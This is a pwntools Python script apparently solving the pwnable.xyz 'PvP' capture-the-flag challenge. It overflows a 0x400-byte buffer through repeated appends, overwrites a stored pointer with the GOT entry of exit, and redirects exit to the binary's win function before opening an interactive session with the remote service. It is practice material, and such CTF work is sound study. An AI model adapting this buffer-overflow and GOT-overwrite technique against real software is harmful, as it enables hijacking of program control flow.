from pwn import *

# Pwnable.xyz PvP challenge
# 100 points

"""
PvP - Programmatically vulnerable Program
Menu:
 1. Short Append
 2. Long Append
 3. Print it
 4. Save
 0. Exit.
> 
"""

context(kernel="amd64", arch="amd64", log_level="debug")

def get_length(p):
	line = p.recvuntil(b": ")
	# Line should looks like "Give me 926 chars: "
	return int(line.split(b" ")[2])

def send_str(p, str_length, addr_to_write, buffer_len=0x400):
	done = False
	addr = pack(addr_to_write)
	while str_length <= buffer_len+3:
		print()
		p.sendlineafter(b"> ", b"1")
		acceptable_length = get_length(p)
		if (str_length+acceptable_length <= buffer_len):
			p.send(b"A"*acceptable_length)
		else:
			payload = b"A"*(buffer_len-str_length)
			payload += addr[:acceptable_length-(buffer_len-str_length)]
			p.send(payload)
			addr = addr[acceptable_length-(buffer_len-str_length):]
		str_length += acceptable_length




def main():
	e = ELF("challenge")
	if 0:
		p = process("./challenge")
		# gdb.attach(p, gdbscript="b *0x0000000000400cd4\nb handler\nb save_it\nc")
	elif 0:
		p = process(["strace", "-o", "strace.out", "./challenge"])
	else:
		p = remote("svc.pwnable.xyz", 30022)

	win_addr = e.symbols["win"]

	target = e.got["exit"]
	crafted_len = 0x400

	p.sendlineafter(b"> ", b"2")
	acc_len = get_length(p)
	print("[+] Start length: %d" % acc_len)
	p.send(pack(win_addr)[:3]+b"A"*(acc_len-3))

	# overwrite saved_msg pointer
	send_str(p, acc_len, target)
	print("[+] Sended payload")

	# overwrite exit got address
	p.sendlineafter(b"> ", b"4")
	p.sendlineafter(b"How many bytes is your message? ", b"3")

	# Just wait 1 minute
	print("...")
	p.interactive()
	print(p.recvrepeat())



main()